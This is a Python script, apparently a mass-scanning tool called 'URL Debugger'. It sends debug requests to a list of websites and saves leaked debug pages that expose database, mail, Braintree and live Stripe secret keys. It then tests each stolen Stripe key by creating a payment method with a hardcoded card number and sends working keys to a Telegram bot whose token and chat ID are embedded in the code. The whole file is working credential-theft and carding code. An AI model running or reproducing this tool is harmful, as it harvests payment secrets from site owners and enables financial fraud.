import re
import sys
import os
import urllib3
import requests
from os import path
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

Bot_TOKEN = "7159708949:AAHbCrsK2NnucwuDeKLcCdzlBEqEiiiK9yI"
USER_ID = "1312277549"
pattern = r"sk_live_([A-Za-z0-9]+)"

class xcol:
    LGREEN = '\033[38;2;129;199;116m'
    LRED = '\033[38;2;239;83;80m'
    RESET = '\u001B[0m'
    LXC = '\033[38;2;255;152;0m'
    GREY = '\033[38;2;158;158;158m'

class ENV:
    def __init__(self):
        self.counts = {
            "checked": 0,
            "total_debug": 0,
            "live_sk": 0,
            "integration_off_sk": 0,
            "dead_sk": 0,
            "braintree": 0
        }

    def scan(self, url):
        mch = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME', 'sk_live', 'APP_DEBUG', 'BRAINTREE_PUBLIC_KEY']
        try:
            data = {'debug': 'true'}
            r = requests.post(f'https://{url}', data=data, allow_redirects=False, verify=False, timeout=10)
            resp = r.text
            self.counts["checked"] += 1
            if any(key in resp for key in mch):
                with open(os.path.join('DEBUG', f'{url}_debug.htm'), 'w', encoding='utf-8') as output:
                    output.write(f'{resp}\n')
                self.counts["total_debug"] += 1

                if "sk_live" in resp:
                    with open(os.path.join('SK', f'{url}_debug.htm'), 'w', encoding='utf-8') as output:
                        output.write(f'{resp}\n')
                    matches = re.findall(pattern, resp)
                    for match in matches:
                        sk_live = f"sk_live_{match}"
                        self.log_live_key(sk_live)
                        self.process_sk(sk_live)

                if "BRAINTREE_PUBLIC_KEY" in resp:
                    with open('Braintree.txt', 'a') as file_object:
                        file_object.write(f'Braintree : {url}\n')
                    self.counts["braintree"] += 1
        except Exception:
            pass
        self.update_console()

    def log_live_key(self, line):
        sk_live_key = re.sub(".*sk_live", "sk_live", line)
        with open('SK_LIVE.TXT', 'a') as file_object:
            file_object.write(sk_live_key + '\n')

    def process_sk(self, sk_live_key):
        url = "https://api.stripe.com/v1/payment_methods"
        data = {
            "type": "card",
            "card[number]": "5178058714350744",
            "card[exp_month]": "01",
            "card[exp_year]": "2027",
            "card[cvc]": "263"
        }
        headers = {
            "Authorization": f"Bearer {sk_live_key}"
        }
        response = requests.post(url, data=data, headers=headers)
        if response.status_code == 200:
            response_json = response.json()
            if "id" in response_json:
                message = f"Live sk : {sk_live_key}"
                requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={message}&parse_mode=HTML")
                self.counts["live_sk"] += 1
            else:
                self.counts["live_sk"] += 1
        elif response.status_code == 401 and "api_key_expired" in response.text:
            self.counts["dead_sk"] += 1
        elif "Sending credit card numbers directly to the Stripe API is generally unsafe" in response.text:
            message = f"sk integration off : {sk_live_key}"
            requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={message}&parse_mode=HTML")
            self.counts["integration_off_sk"] += 1
        else:
            self.counts["dead_sk"] += 1

    def update_console(self):
        total_sk = self.counts['live_sk'] + self.counts['integration_off_sk'] + self.counts['dead_sk']
        sys.stdout.write(
            f"\rTotal Checked= {self.counts['checked']}, Total debug: {self.counts['total_debug']}, Total sk: {total_sk}, Live sk: {self.counts['live_sk']}, Integration off sk: {self.counts['integration_off_sk']}, Dead sk: {self.counts['dead_sk']}, Braintree: {self.counts['braintree']}")
        sys.stdout.flush()

if __name__ == '__main__':
    os.system('clear')
    print(""" \033[38;2;158;158;158m
██╗   ██╗██████╗ ██╗         ██████╗ ███████╗██████╗ ██╗   ██╗ ██████╗  ██████╗ ███████╗██████╗ 
██║   ██║██╔══██╗██║         ██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
██║   ██║██████╔╝██║         ██║  ██║█████╗  ██████╔╝██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
██║   ██║██╔══██╗██║         ██║  ██║██╔══╝  ██╔══██╗██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
╚██████╔╝██║  ██║███████╗    ██████╔╝███████╗██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚══════╝╚═════╝  ╚═════╝  ╚══════╝╚═╝  ╚═╝
                                                                                                

  \u001B[0m""")
    if not os.path.isdir("DEBUG"):
        os.makedirs("DEBUG")
    if not os.path.isdir("SK"):
        os.makedirs("SK")
    threads = []
    while True:
        try:
            thrd = int(input(xcol.GREY + "[THREAD] : " + xcol.RESET))
            break
        except ValueError:
            print("Invalid input. Please enter an integer.")

    while True:
        try:
            inpFile = input(xcol.GREY + "[URLS PATH] : " + xcol.RESET)
            with open(inpFile) as urlList:
                argFile = urlList.read().splitlines()
            break
        except FileNotFoundError:
            print("File not found. Please enter a valid file path.")

    with ThreadPoolExecutor(max_workers=thrd) as executor:
        env_scanner = ENV()
        for data in argFile:
            threads.append(executor.submit(env_scanner.scan, data))

    for task in threads:
        task.result()

    quit()
